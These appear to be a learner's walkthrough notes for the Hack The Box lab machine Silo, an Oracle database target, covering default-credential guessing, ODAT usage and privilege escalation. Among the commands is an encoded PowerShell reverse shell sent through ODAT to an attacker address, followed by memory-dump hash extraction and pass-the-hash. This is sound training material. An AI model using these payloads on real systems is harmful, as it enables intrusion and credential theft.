# Silo Helped-Through

Name: Silo
Date:  19/9/2025
Difficulty:  Medium
Goals:  
- Old OSCP like machine - not harder
- Is Guided mode good
Learnt:
- Sometimes just use metasploit forever and hope 
- base64 encode files just incase there is a password that is encoded weirdly and decode incorrectly by stdout
- I need to practice the how could this get me to x in a non-standard way check
- There always needs some turn about revision - scott 
- Wordlists
Beyond Root:
- python2 in the near 2030s...
- PATH and so libraries 

- [[Silo-Notes.md]]
- [[Silo-CMD-by-CMDs.md]]

Instead of watching along or reading along with a write up to speed up the progress of actual getting to the important thing I need to know and the gotchas I am trying Guided mode on all old OSCP-like HTB pre 2024 except the one considered Harder than OSCP. Also I am not willing to host my own VMs and manage them for awhile till I figure out an actually secure solution - if there will ever be one... These are 3 hour maximum till I cave to a writeup. I will also watch the corresponding IppSec video as a reminder. 

I have already done some of the enumeration, but instead I want to get an idea of what the pwnbox does and does not have that I like.
## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Silo/Screenshots/ping.png)
Previously checked RPC
![](nonullauthforrpc.png)
And SMB with `crackmapexec`
![](cmesmbtest.png)

Starting from scratch with `nmap`
![](nmap-silo-tcp.png)

Now with the `-sC` and `-sV` flags
```bash
nmap -Pn -sC -sV --min-rate 500 -e tun0 -p 80,135,139,445,1521,5985 -oA sc-sv-TCP-ports 10.129.95.188
```
![](nmap-silo-sc-sv.png)

[oracle "TNS Listener Poison Attack"](https://www.oracle.com/security-alerts/alert-cve-2012-1675.html) - without authentication. [PoC for TNS Listener Poison Attack](https://github.com/bongbongco/CVE-2012-1675/blob/master/oracle-tns-poison.nse)

There is SID enumeration tool in `msfconsole`
![](phind-sid-bruteforce.png)

At this point have done this for awhile unsuccessfully (CTFs) - the strictness of old time kicks in. So how was I suppose to find this username?
![](scottfromwhere.png)
running `msf auxiliary/scanner/oracle/oracle_login` we have no scott
![](msfnmapinmsf-no-scott.png)

Presumably this is the machine that would be the machine that would teach you just to make a wordlist for users.

```bash
for i in $(cat /usr/share/metasploit-framework/data/wordlists/namelist.txt); do echo "$i password" | tee -a part; done
```
I then added a scott user as there was not even one in the metasploit usernames list...

So I am going to watch the IppSec video for this
![](itdidnotlikethat.png)

TIGER - scott / tiger is default?
![](TIGER.png)

Also WTF has happened to HackTricks if https://book.hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener.html is the mirrored version is way better 
https://github.com/TheSnowWight/hackdocs/blob/master/pentesting/1521-1522-1529-pentesting-oracle-listener/README.md

```bash
# Which glibc does a machine has installed
ldd --version
```

After failing to install `sqlplus` both ways on the pwnbox - I really did not want to setup so libraries at that point but it'll make for a good beyond root. I decided to see what IppSec did, enjoyed the history of the box and the attack path was ODAT. So I decided to tire myself out on dipping into python2 hell and seeing I could update a previously working technique for getting python2 to work in 2020s. Might as well get this done now... and test my patience. There is a [medium article by Mario Rufisanto on Oracle TNS Pentesting 2024](https://medium.com/fmisec/oracle-tns-penetration-test-using-odat-83fafcea1988) - 2024. 

And it starts with a setup script. Amazing! Just had to remove the <> around the git clone in line 5. 
```bash
#!/bin/bash  
  
sudo apt-get install libaio1 python3-dev alien python3-pip -y  
git clone https://github.com/quentinhardy/odat.git  
cd odat/  
git submodule init  
git submodule update  
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y  
pip3 install cx_Oracle  
sudo apt-get install python3-scapy -y  
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap  
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```
The worrying part is that I do not need `python2`.. but that can wait till beyond root, which is a nice boost to momentum.

![](hurrayFormarioandodat.png)

So decided that as the box is done due to how the Oracle database is configured and `odat` we could just read through the article. But unfortunately this another indirect write up of the machine so...

Phind found this blog to help when the tool would not give the arguments in -h
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-the-giant-how-odat-challenges-oracle-the-king-of-databases/. BECAUSE I did not type utlfile correctly.. So that blog is old and wrong..


```bash
# Remember Odat is like impacket there are lots of tools
# Takes awhile and there are prompts
./odat.py all -s $ip

# service name guessing is required
./odat.py snguesser -s $ip
# SID Guess is required
./odat.py snguesser -s $ip

# this tool asks alot try a different tool for this
./odat.py passwordguesser -s $ip

# With valid credentials and permission you can upload a shell and execute it 
# Weirdly it has whitespace for the path then the file
./odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U username -P password --getFile remotePath remoteFile localFile

./odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U username -P password  --putFile remotePath remoteFile localFile

./odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U username -P password ----removeFile remotePath remoteFile 

# This seems weird from an OPSEC, but this tool is from a different era
./odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U username -P password --test-module 

./odat.py externaltable
```

For the archive just because 
```python
# Version 5.1.1 - 2022/04/27
./odat.py -h
	positional arguments:
  {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
                      
                      Choose a main command
    all               to run all modules in order to know what it is possible to do
    tnscmd            to communicate with the TNS listener
    tnspoison         to exploit TNS poisoning attack (SID required)
    sidguesser        to know valid SIDs
    snguesser         to know valid Service Name(s)
    passwordguesser   to know valid credentials
    utlhttp           to send HTTP requests or to scan ports
    httpuritype       to send HTTP requests or to scan ports
    utltcp            to scan ports
    ctxsys            to read files
    externaltable     to read files or to execute system commands/scripts
    dbmsxslprocessor  to upload files
    dbmsadvisor       to upload files
    utlfile           to download/upload/delete files
    dbmsscheduler     to execute system commands without a standard output
    java              to execute system commands
    passwordstealer   to get hashed Oracle passwords
    oradbg            to execute a bin or script
    dbmslob           to download files
    stealremotepwds   to steal hashed passwords thanks an authentication sniffing (CVE-2012-3137)
    userlikepwd       to try each Oracle username stored in the DB like the corresponding pwd
    smb               to capture the SMB authentication
    privesc           to gain elevated access
    cve               to exploit a CVE
    search            to search in databases, tables and columns
    unwrapper         to unwrap PL/SQL source code (no for 9i version)
    clean             clean traces and logs

options:
  -h, --help          show this help message and exit
  --version           show program's version number and exit

```

`sqlplus`
```bash
# if error:
# `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

Mostly because I wanted to validate if scott is actually a default user. It is in the logins list.. interesting given that the box creator did not know about odat according to Ippsec.
![](scottisinthelist.png)

I decided to ask Phind to find where it uses login.txt to find it is used in passwordguesser, which is a weird that the tool combines and names it passwordguesser... I realised it skipped it due to the many prompts. The tiger password is not in the odat pwds... so this is one those awkward moments. Anyway this one of those box that is just wordlist hellscape. So I am going to watch how Ippsec did this and note that this logins.txt is a good users.txt...

Also I may break the box just to install sqlplus. Basically I want a self-hosting AI that makes specialised wordlist intelligently or a fucking committee of matching the hacking tool and the statistically best-by-country wordlist per network port levels of solution to this "problem". I can dream.

To add to this another gotcha is: 


Ippsec: Oracle 9 is uppercase, but later version are case sensitive

My speed the spies the unimaginable from the mathematical shit show that would be combine user and password guessing game of eternity:
![](itsinthemetasploitthatippsecuses.png)

Ippsec then cheats... I now understand why I did not do this machine. Basically the solution is use metasploit forever.

![](canyoutellifitisrunning.png)

For the sake of `tcpdump` and no more saltdump
![](intensesaltcontinues.png)

Well at this point...I am not going to do this the intended way. But will learn about how I could have once I learn about force binaries to remember their so libraries in beyond root along with potentially more funky naming fun with msdat.  

And then I failed to type `utlfile`
![](WTFisthistool.png)

So presumable the box got updated so I have to have sqlplus
![](presumabletheprivlegesgotchanged.png)

So while I waited for the pwnbox to install 2gb of packages and potential break my python setup now on the box. I came to a sad, but probably guessable answer:
![](liketearsintherain.png)

sqlplus does not have ctrl + c support. 
![](scottyfindthefuckingctrlc.png)

https://github.com/TheSnowWight/hackdocs/blob/master/pentesting/1521-1522-1529-pentesting-oracle-listener/README.md
```bash

sqlplus <username>/<password>@<ip_address>:<port>/<SID>;

```

```bash
tcpdump -nvvvvXi tun0 tcp port 1521 -w auth.pcap
```
Some reason wireshark is not allowed to be root or monitor tun0
![](justoseewhathappenedtothepassword.png)

Well PL/SQL does not have the same show database, or show tables...

![](okthen.png)

https://www.geeksforgeeks.org/sql/sqlplus-command-reference/
https://docs.oracle.com/en/database/oracle/oracle-database/18/sqpqr/sqlplus-quick-reference.pdf
https://docs.oracle.com/search/?q=show+database%3B&lang=en&book=SQLRF&library=en%2Fdatabase%2Foracle%2Foracle-database%2F19

Went back to https://medium.com/fmisec/oracle-tns-penetration-test-using-odat-83fafcea1988 and then realised that `select table_name from all_tables` is not a insert table name. We get 75 different tables:

There is no obvious users table
```
SYSTEM_PRIVILEGE_MAP
```

```sql
TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP
DR$OBJECT_ATTRIBUTE
DR$POLICY_TAB
DR$THS
DR$THS_PHRASE
DR$NUMBER_SEQUENCE
SRSNAMESPACE_TABLE
OGIS_SPATIAL_REFERENCE_SYSTEMS
OGIS_GEOMETRY_COLUMNS
SDO_UNITS_OF_MEASURE
SDO_PRIME_MERIDIANS
SDO_ELLIPSOIDS
SDO_DATUMS
SDO_COORD_SYS
SDO_COORD_AXIS_NAMES
SDO_COORD_AXES
SDO_COORD_REF_SYS
SDO_COORD_OP_METHODS
SDO_COORD_OPS
SDO_PREFERRED_OPS_SYSTEM
SDO_PREFERRED_OPS_USER
SDO_COORD_OP_PATHS
SDO_COORD_OP_PARAMS
SDO_COORD_OP_PARAM_USE
SDO_COORD_OP_PARAM_VALS
SDO_CS_SRS
NTV2_XML_DATA
SDO_CRS_GEOGRAPHIC_PLUS_HEIGHT
SDO_PROJECTIONS_OLD_SNAPSHOT
SDO_ELLIPSOIDS_OLD_SNAPSHOT
SDO_DATUMS_OLD_SNAPSHOT
SDO_XML_SCHEMAS
WWV_FLOW_DUAL100
DEPT
EMP
BONUS
SALGRADE
WWV_FLOW_TEMP_TABLE
WWV_FLOW_LOV_TEMP
SDO_TOPO_DATA$
SDO_TOPO_RELATION_DATA
SDO_TOPO_TRANSACT_DATA
SDO_CS_CONTEXT_INFORMATION
SDO_TXN_IDX_EXP_UPD_RGN
SDO_TXN_IDX_DELETES
SDO_TXN_IDX_INSERTS
SDO_ST_TOLERANCE
XDB$XIDX_IMP_T
KU$_DATAPUMP_MASTER_10_1
KU$_DATAPUMP_MASTER_11_1
KU$_DATAPUMP_MASTER_11_1_0_7
KU$_DATAPUMP_MASTER_11_2
IMPDP_STATS
ODCI_PMO_ROWIDS$
ODCI_WARNINGS$
ODCI_SECOBJ$
KU$_LIST_FILTER_TEMP_2
KU$_LIST_FILTER_TEMP
KU$NOEXP_TAB
OL$NODES
OL$HINTS
OL$
PLAN_TABLE$
WRI$_ADV_ASA_RECO_DATA
PSTUBTBL

75 rows selected.
```

The clue is that we have to login do not have resource permissions so there must be something about the technology and the box that allows you to change it... no you just login `as sysdba`.

```bash

sqlplus scott/tiger@10.129.95.188:1521/XE as sysdba;
# Looked at this table
SELECT * FROM SYSTEM_PRIVILEGE_MAP;
```

Surely I am not using odat correctly...
![](assysdbaitis.png)
Looked at the reverse shell in Java.py
![](sadnessnoimplemented.png)

```powershell
./odat.py java -s 10.129.95.188 -p 1521 -d XE -U scott -P tiger --sysdba --exec 'powershell "-nop -Windowstyle hidden -ep bypass -enc $JGEgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjE2MycsODQ0Myk7JGIgPSAkYS5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRjID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkYi5SZWFkKCRjLCAwLCAkYy5MZW5ndGgpKSAtbmUgMCl7OyRkID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYywwLCAkaSk7JGYgPSAoaWV4ICRkIDI+JjEgfCBPdXQtU3RyaW5nICk7JGcgPSAkZiArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJGcpOyRiLldyaXRlKCRlLDAsJGUuTGVuZ3RoKTskYi5GbHVzaCgpfTskYS5DbG9zZSgp"'

[-]] Impossible to use the JAVA library to execute a system command: `ORA-29538: Java not installed`

```

![](notsurethisworks.png)

The problem I foresee uploading a webshell as we cannot execute commands is where the webshell needs to uploaded to
![](moresadnessnoexec.png)
Still hope
![](stillhope.png)

installer is has been served
![](installerserved.png)

After multiple attempts with quotes, without quotes, with and without `cmd.exe /c`
I got `odat.py: error: unrecognized arguments`. After reading the DbmsScheduler.py to see how it worked I saw a `getReverseShellPowershellCommand()` and then
![](hurrayreverseshell.png)

Well the shell was crazy un-interactive and `certutil`, `net` and `whoami`, etc are not in use. Tried to get another reverse shell with metasploit, but was broken. use x64. Uploaded winpeas.bat and got:
![](notsoawesome.png)

Because Windows 6 is old, I tried x86 version with the plan of hosting it on the webserver to read remotely. Also copy and pasting into locally for later reading. I wanted to at least try PrivEsc without metepreter migration tactics first. Importantly I found the `C:\inetpub\wwwroot\` so while winPEAS was chugging away I thought upload a web shell for finally achieving the two is one malwarejakism and feeling safer. I could always just get another shell with odat, but I might actually gain more utility with a web shell weirdly. 

Neither cmd.asp(x) found in wwwroot or / 
![](nowebshell.png)

Rough times being had by all, but the silo. The odat reverse shell uses powershell to make the web request, so why I could not run powershell is weird. 
![](wellthisisgood.png)

Well that is not intended. WinPEAS is still going and has not stdout into the file yet. I do not think I will learn anything by uploading powercat or nc.exe just to get the file - I want to finish this. Started watching Ippsec and around 27 minute that Oracle does not like files over 1024 characters
![](nopesizeisfine.png)

type "" is better
![](passwordfound.png)

Tried the link - doubled checked if that is the correct path
![](incorrectpassword.png)

This is sort of old box weirdness. I would have never understood this. 
![](iwouldhavenevercheckedthat.png)
Password still does not work. Lesson learnt that is why everything was encoded in base64 back to attacking machines in books and older cheatsheets, tutorials - stdout encoding. Anyway there is a memory dump and I want this machine finished to move on to another and I do not have a nice DFIR or RevEng VM and I have not used metasploit for 2 years. I decided to try install volatility3 - I have had issues in the past installing this sometimes or modules so I was not tempted originally

Installation rabbitholes are to be avoided
![](notvolingaround.png)

But 
![](tearofmetepreter.png)

Looked up how to install volatility3 apparent the bin is called vol.. I am sure it was vol3 or it was some box that had both vol2 and vol3 and vol2 was called vol
![](andthenamingescapedme.png)

![](ahyesthebadsetuphell.png)

After watching Ippsec press -h I tried again, needed sudo because parrot permission on directory
```bash
# No password in the environment variables
sudo vol -f SILO-20180105-221806.dmp windows.envars.Envars 
```

![](isitcmdlinenoworky.png)

And then hashdump
![](nthashshurray.png)

But no crack
![](sadhashcat.png)

![](passwordrequired.png)

Forgot that pass the hash exists after check the description of Ippsec video
![](nopsexec.png)

Ippsec uses another old tool. 0xdf uses psexec, but with modern impacket it needs dns resolution for SMB. So lesson learnt there too. - https://medium.com/@v1per/silo-hackthebox-writeup-cec449e0a4bc.


## Beyond Root

Try install msdat in 2025 
https://github.com/quentinhardy/msdat
